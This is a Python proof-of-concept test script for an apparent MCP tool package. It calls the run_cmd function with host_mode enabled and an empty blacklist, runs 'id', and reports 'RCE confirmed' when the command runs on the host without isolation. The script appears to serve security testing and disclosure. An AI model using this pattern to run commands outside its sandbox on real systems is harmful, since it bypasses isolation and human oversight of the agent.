import os
from pathlib import Path
import sys

# Add src to path
sys.path.insert(0, os.getcwd())

from llmc_mcp.tools.cmd import run_cmd


def test_hybrid_rce():
    print("--- PoC: Command Injection via run_cmd (Hybrid Mode) ---")

    # Simulate Hybrid Mode: host_mode=True
    # Simulate empty blacklist (default)

    cmd = "id"
    cwd = Path(".")

    print(f"[+] Executing '{cmd}' with host_mode=True (Hybrid Mode) ...")

    result = run_cmd(
        command=cmd,
        cwd=cwd,
        blacklist=[],  # Default config
        host_mode=True,  # Hybrid mode setting
        timeout=5,
    )

    print(f"[+] Success: {result.success}")
    print(f"[+] Stdout: {result.stdout.strip()}")
    print(f"[+] Stderr: {result.stderr.strip()}")

    if result.success and "uid=" in result.stdout:
        print("\n[!] SUCCESS: RCE confirmed! Executed 'id' without isolation.")
    else:
        print("\n[-] FAILED: Could not verify RCE.")


if __name__ == "__main__":
    test_hybrid_rce()
